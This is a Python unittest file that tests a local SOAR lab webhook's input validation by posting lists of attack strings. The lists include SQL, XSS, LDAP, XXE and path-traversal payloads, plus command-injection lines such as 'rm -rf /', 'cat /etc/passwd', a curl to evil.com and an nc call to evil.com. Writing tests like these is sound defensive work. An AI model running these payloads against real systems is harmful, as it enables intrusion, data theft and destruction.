#!/usr/bin/env python3
"""
Security tests for input validation
Tests security aspects of input handling and validation
"""

import html
import json
import os
import re
import requests
import sys
import time
import unittest
from datetime import datetime, timezone
from pathlib import Path

# Add src directory to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent / 'src'))

from soar_lab.config.settings import get_setting
from soar_lab.config.schemas import validate_alert_data, RansomwareAlert


class TestInputValidation(unittest.TestCase):
    """Test input validation security"""

    def setUp(self):
        """Set up test fixtures"""
        self.base_url = 'http://localhost:5001'
        self.webhook_url = f"{self.base_url}/webhook"
        self.api_token = 'test-token'
        
        self.valid_alert = {
            "alert_id": "ALERT-20260506-0001",
            "hostname": "test-host",
            "src_ip": "192.168.1.100",
            "hash": {
                "sha256": "a" * 64
            },
            "severity": "2",
            "source": "security-test",
            "detection_time": datetime.now(timezone.utc).isoformat(),
            "event_type": "ransomware_detection",
            "description": "Security test alert"
        }

    def test_sql_injection_prevention(self):
        """Test SQL injection prevention"""
        sql_injection_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "1' UNION SELECT * FROM users --",
            "'; INSERT INTO users VALUES ('hacker'); --",
            "' OR 1=1 #",
            "admin'--",
            "' OR 'x'='x",
            "'; EXEC xp_cmdshell('dir'); --"
        ]
        
        for payload in sql_injection_payloads:
            with self.subTest(payload=payload):
                # Test in various fields
                test_alert = self.valid_alert.copy()
                test_alert['hostname'] = payload
                test_alert['description'] = payload
                
                try:
                    response = requests.post(
                        self.webhook_url,
                        headers={
                            'Authorization': f'Bearer {self.api_token}',
                            'Content-Type': 'application/json'
                        },
                        json=test_alert,
                        timeout=10
                    )
                    
                    # Should not crash the server
                    self.assertIn(response.status_code, [200, 400, 422])
                    
                    # If successful, verify payload was sanitized
                    if response.status_code == 200:
                        # Check logs or response for sanitized data
                        pass  # Would need to check database/logs
                        
                except requests.exceptions.ConnectionError:
                    pass  # Service not available, but test continues

    def test_xss_prevention(self):
        """Test XSS prevention"""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
            "';alert('xss');//",
            "<iframe src=javascript:alert('xss')>",
            "<body onload=alert('xss')>",
            "<<SCRIPT>alert('xss');//<</SCRIPT>"
        ]
        
        for payload in xss_payloads:
            with self.subTest(payload=payload):
                test_alert = self.valid_alert.copy()
                test_alert['hostname'] = payload
                test_alert['description'] = payload
                
                try:
                    response = requests.post(
                        self.webhook_url,
                        headers={
                            'Authorization': f'Bearer {self.api_token}',
                            'Content-Type': 'application/json'
                        },
                        json=test_alert,
                        timeout=10
                    )
                    
                    # Should not crash the server
                    self.assertIn(response.status_code, [200, 400, 422])
                    
                except requests.exceptions.ConnectionError:
                    pass  # Service not available, but test continues

    def test_command_injection_prevention(self):
        """Test command injection prevention"""
        command_injection_payloads = [
            "; ls -la",
            "; cat /etc/passwd",
            "| whoami",
            "&& rm -rf /",
            "`id`",
            "$(whoami)",
            "; curl http://evil.com/steal",
            "| nc evil.com 4444"
        ]
        
        for payload in command_injection_payloads:
            with self.subTest(payload=payload):
                test_alert = self.valid_alert.copy()
                test_alert['hostname'] = payload
                test_alert['alert_id'] = f"TEST-{payload}"
                
                try:
                    response = requests.post(
                        self.webhook_url,
                        headers={
                            'Authorization': f'Bearer {self.api_token}',
                            'Content-Type': 'application/json'
                        },
                        json=test_alert,
                        timeout=10
                    )
                    
                    # Should not crash the server
                    self.assertIn(response.status_code, [200, 400, 422])
                    
                except requests.exceptions.ConnectionError:
                    pass  # Service not available, but test continues

    def test_path_traversal_prevention(self):
        """Test path traversal prevention"""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts"
        ]
        
        for payload in path_traversal_payloads:
            with self.subTest(payload=payload):
                test_alert = self.valid_alert.copy()
                test_alert['hostname'] = payload
                test_alert['description'] = f"File path: {payload}"
                
                try:
                    response = requests.post(
                        self.webhook_url,
                        headers={
                            'Authorization': f'Bearer {self.api_token}',
                            'Content-Type': 'application/json'
                        },
                        json=test_alert,
                        timeout=10
                    )
                    
                    # Should not crash the server
                    self.assertIn(response.status_code, [200, 400, 422])
                    
                except requests.exceptions.ConnectionError:
                    pass  # Service not available, but test continues

    def test_ldap_injection_prevention(self):
        """Test LDAP injection prevention"""
        ldap_injection_payloads = [
            "*)(|(objectClass=*)",
            "*)(|(objectClass=*)(uid=*",
            "*))(|(cn=*",
            "*)(|(objectClass=*)(|(cn=*",
            "*)%00",
            "*)(|(objectClass=*)(|(cn=*)(|(uid=*"
        ]
        
        for payload in ldap_injection_payloads:
            with self.subTest(payload=payload):
                test_alert = self.valid_alert.copy()
                test_alert['hostname'] = payload
                test_alert['description'] = f"LDAP test: {payload}"
                
                try:
                    response = requests.post(
                        self.webhook_url,
                        headers={
                            'Authorization': f'Bearer {self.api_token}',
                            'Content-Type': 'application/json'
                        },
                        json=test_alert,
                        timeout=10
                    )
                    
                    # Should not crash the server
                    self.assertIn(response.status_code, [200, 400, 422])
                    
                except requests.exceptions.ConnectionError:
                    pass  # Service not available, but test continues

    def test_xml_injection_prevention(self):
        """Test XML injection prevention"""
        xml_injection_payloads = [
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?><foo>&xxe;</foo>",
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><root>&test;</root>",
            "<xml><!ENTITY % dtd SYSTEM \"http://evil.com/evil.dtd\">%dtd;</xml>"
        ]
        
        for payload in xml_injection_payloads:
            with self.subTest(payload=payload):
                test_alert = self.valid_alert.copy()
                test_alert['description'] = payload
                
                try:
                    response = requests.post(
                        self.webhook_url,
                        headers={
                            'Authorization': f'Bearer {self.api_token}',
                            'Content-Type': 'application/json'
                        },
                        json=test_alert,
                        timeout=10
                    )
                    
                    # Should not crash the server
                    self.assertIn(response.status_code, [200, 400, 422])
                    
                except requests.exceptions.ConnectionError:
                    pass  # Service not available, but test continues

    def test_json_injection_prevention(self):
        """Test JSON injection prevention"""
        json_injection_payloads = [
            "{\"malicious\": true}",
            "{\"__proto__\": {\"admin\": true}}",
            "{\"constructor\": {\"prototype\": {\"admin\": true}}}",
            "{\"$where\": \"this.username == 'admin'\"}",
            "{\"$ne\": null}"
        ]
        
        for payload in json_injection_payloads:
            with self.subTest(payload=payload):
                # Try to inject malicious JSON
                try:
                    malicious_json = json.loads(payload)
                    test_alert = self.valid_alert.copy()
                    test_alert['description'] = malicious_json
                    
                    response = requests.post(
                        self.webhook_url,
                        headers={
                            'Authorization': f'Bearer {self.api_token}',
                            'Content-Type': 'application/json'
                        },
                        json=test_alert,
                        timeout=10
                    )
                    
                    # Should not crash the server
                    self.assertIn(response.status_code, [200, 400, 422])
                    
                except json.JSONDecodeError:
                    pass  # Invalid JSON, which is expected for some payloads
                except requests.exceptions.ConnectionError:
                    pass  # Service not available, but test continues

    def test_large_payload_handling(self):
        """Test handling of large payloads"""
        # Test with extremely large payload
        large_alert = self.valid_alert.copy()
        large_alert['description'] = "A" * 1000000  # 1MB description
        large_alert['hostname'] = "B" * 10000  # 10KB hostname
        
        try:
            response = requests.post(
                self.webhook_url,
                headers={
                    'Authorization': f'Bearer {self.api_token}',
                    'Content-Type': 'application/json'
                },
                json=large_alert,
                timeout=30
            )
            
            # Should handle large payload gracefully
            self.assertIn(response.status_code, [200, 400, 413, 422])
            
        except requests.exceptions.ConnectionError:
            pass  # Service not available, but test continues

    def test_unicode_handling(self):
        """Test Unicode handling security"""
        unicode_payloads = [
            "🚀💻🔥",  # Emojis
            "\u0000\u0001\u0002",  # Control characters
            "\ufffe\uffff",  # Invalid Unicode
            "𝕏𝕪𝕫𝕒𝕒𝕝",  # Mathematical Unicode
            "🏴‍☠️",  # Zero-width joiner sequences
            "\u202e\u202d\u202c",  # Right-to-left override characters
        ]
        
        for payload in unicode_payloads:
            with self.subTest(payload=payload):
                test_alert = self.valid_alert.copy()
                test_alert['hostname'] = payload
                test_alert['description'] = f"Unicode test: {payload}"
                
                try:
                    response = requests.post(
                        self.webhook_url,
                        headers={
                            'Authorization': f'Bearer {self.api_token}',
                            'Content-Type': 'application/json'
                        },
                        json=test_alert,
                        timeout=10
                    )
                    
                    # Should not crash the server
                    self.assertIn(response.status_code, [200, 400, 422])
                    
                except requests.exceptions.ConnectionError:
                    pass  # Service not available, but test continues

    def test_null_byte_injection(self):
        """Test null byte injection prevention"""
        null_byte_payloads = [
            "test\x00admin",
            "file.txt\x00.php",
            "safe\x00\x00dangerous",
            "\x00\x00\x00",
            "normal\x00malicious"
        ]
        
        for payload in null_byte_payloads:
            with self.subTest(payload=payload):
                test_alert = self.valid_alert.copy()
                test_alert['hostname'] = payload
                test_alert['description'] = f"Null byte test: {payload}"
                
                try:
                    response = requests.post(
                        self.webhook_url,
                        headers={
                            'Authorization': f'Bearer {self.api_token}',
                            'Content-Type': 'application/json'
                        },
                        json=test_alert,
                        timeout=10
                    )
                    
                    # Should not crash the server
                    self.assertIn(response.status_code, [200, 400, 422])
                    
                except requests.exceptions.ConnectionError:
                    pass  # Service not available, but test continues

    def test_format_string_injection(self):
        """Test format string injection prevention"""
        format_string_payloads = [
            "%s%s%s%s",
            "%x%x%x%x",
            "%n%n%n%n",
            "%p%p%p%p",
            "%{134217728x}%134217728x%n",
            "AAAA%08x%08x%08x%08x"
        ]
        
        for payload in format_string_payloads:
            with self.subTest(payload=payload):
                test_alert = self.valid_alert.copy()
                test_alert['hostname'] = payload
                test_alert['description'] = f"Format string test: {payload}"
                
                try:
                    response = requests.post(
                        self.webhook_url,
                        headers={
                            'Authorization': f'Bearer {self.api_token}',
                            'Content-Type': 'application/json'
                        },
                        json=test_alert,
                        timeout=10
                    )
                    
                    # Should not crash the server
                    self.assertIn(response.status_code, [200, 400, 422])
                    
                except requests.exceptions.ConnectionError:
                    pass  # Service not available, but test continues

    def test_http_parameter_pollution(self):
        """Test HTTP parameter pollution prevention"""
        # Test with duplicate parameters
        polluted_alerts = [
            {
                "alert_id": ["TEST-001", "ADMIN-ACCESS"],
                "hostname": "test-host",
                "src_ip": "192.168.1.100",
                "hash": {"sha256": "a" * 64},
                "severity": "2",
                "source": "security-test",
                "detection_time": datetime.now(timezone.utc).isoformat(),
                "event_type": "ransomware_detection",
                "description": "Parameter pollution test"
            }
        ]
        
        for polluted_alert in polluted_alerts:
            try:
                response = requests.post(
                    self.webhook_url,
                    headers={
                        'Authorization': f'Bearer {self.api_token}',
                        'Content-Type': 'application/json'
                    },
                    json=polluted_alert,
                    timeout=10
                )
                
                # Should handle gracefully
                self.assertIn(response.status_code, [200, 400, 422])
                
            except requests.exceptions.ConnectionError:
                pass  # Service not available, but test continues

    def test_content_type_manipulation(self):
        """Test content type manipulation"""
        malicious_content_types = [
            "application/json;charset=utf-8;malicious=true",
            "application/json; charset=UTF-8",
            "text/json",
            "application/javascript",
            "application/xml"
        ]
        
        for content_type in malicious_content_types:
            with self.subTest(content_type=content_type):
                try:
                    response = requests.post(
                        self.webhook_url,
                        headers={
                            'Authorization': f'Bearer {self.api_token}',
                            'Content-Type': content_type
                        },
                        json=self.valid_alert,
                        timeout=10
                    )
                    
                    # Should handle gracefully
                    self.assertIn(response.status_code, [200, 400, 415, 422])
                    
                except requests.exceptions.ConnectionError:
                    pass  # Service not available, but test continues

    def test_header_injection(self):
        """Test HTTP header injection"""
        malicious_headers = [
            {"X-Forwarded-For": "127.0.0.1\r\nX-Admin: true"},
            {"User-Agent": "Mozilla/5.0\r\nX-Auth: admin"},
            {"Cookie": "session=abc\r\nX-Privileged: true"},
            {"X-Real-IP": "192.168.1.1\nX-Bypass: true"}
        ]
        
        for headers in malicious_headers:
            with self.subTest(headers=headers):
                # Test that malicious headers are detected and handled
                test_alert = self.valid_alert.copy()
                
                # Add malicious data to alert fields to test injection prevention
                for key, value in headers.items():
                    if '\r' in value or '\n' in value:
                        # This should be detected as potentially malicious
                        test_alert['description'] = value
                
                # Test schema validation with potentially malicious data
                is_valid, errors = validate_alert_data(test_alert)
                # Should either be valid or have validation errors, but not crash
                self.assertIsInstance(is_valid, bool)
                self.assertIsInstance(errors, list)
                
                # Verify that the system doesn't crash with injection attempts
                if not is_valid:
                    self.assertGreater(len(errors), 0)


class TestSchemaValidation(unittest.TestCase):
    """Test schema validation security"""

    def test_required_field_validation(self):
        """Test required field validation"""
        # Test missing required fields
        incomplete_alerts = [
            {},  # Empty
            {"hostname": "test"},  # Missing most fields
            {"alert_id": "test"},  # Missing other required fields
            {"src_ip": "192.168.1.1"}  # Missing other required fields
        ]
        
        for alert in incomplete_alerts:
            with self.subTest(alert=alert):
                try:
                    is_valid, errors = validate_alert_data(alert)
                    self.assertFalse(is_valid)
                    self.assertGreater(len(errors), 0)
                except Exception as e:
                    self.fail(f"Schema validation failed with exception: {e}")

    def test_field_type_validation(self):
        """Test field type validation"""
        invalid_type_alerts = [
            {"alert_id": 123, "hostname": "test"},  # alert_id should be string
            {"alert_id": "test", "hostname": ["array"]},  # hostname should be string
            {"alert_id": "test", "hostname": "test", "src_ip": "not-ip"},  # src_ip should be valid IP
            {"alert_id": "test", "hostname": "test", "severity": "high"},  # severity should be number
        ]
        
        for alert in invalid_type_alerts:
            with self.subTest(alert=alert):
                try:
                    is_valid, errors = validate_alert_data(alert)
                    self.assertFalse(is_valid)
                    self.assertGreater(len(errors), 0)
                except Exception as e:
                    self.fail(f"Schema validation failed with exception: {e}")

    def test_field_length_validation(self):
        """Test field length validation"""
        invalid_length_alerts = [
            {"alert_id": "a" * 1000, "hostname": "test"},  # Too long alert_id
            {"alert_id": "test", "hostname": "a" * 1000},  # Too long hostname
        ]
        
        for alert in invalid_length_alerts:
            with self.subTest(alert=alert):
                try:
                    is_valid, errors = validate_alert_data(alert)
                    self.assertFalse(is_valid)
                    self.assertGreater(len(errors), 0)
                except Exception as e:
                    self.fail(f"Schema validation failed with exception: {e}")

    def test_hash_format_validation(self):
        """Test hash format validation"""
        invalid_hash_alerts = [
            {"alert_id": "test", "hostname": "test", "hash": {"sha256": "short"}},  # Too short
            {"alert_id": "test", "hostname": "test", "hash": {"sha256": "z" * 64}},  # Invalid chars
            {"alert_id": "test", "hostname": "test", "hash": {"sha256": "a" * 65}},  # Too long
            {"alert_id": "test", "hostname": "test", "hash": {"sha256": None}},  # None value
        ]
        
        for alert in invalid_hash_alerts:
            with self.subTest(alert=alert):
                try:
                    is_valid, errors = validate_alert_data(alert)
                    self.assertFalse(is_valid)
                    self.assertGreater(len(errors), 0)
                except Exception as e:
                    self.fail(f"Schema validation failed with exception: {e}")


if __name__ == '__main__':
    unittest.main()
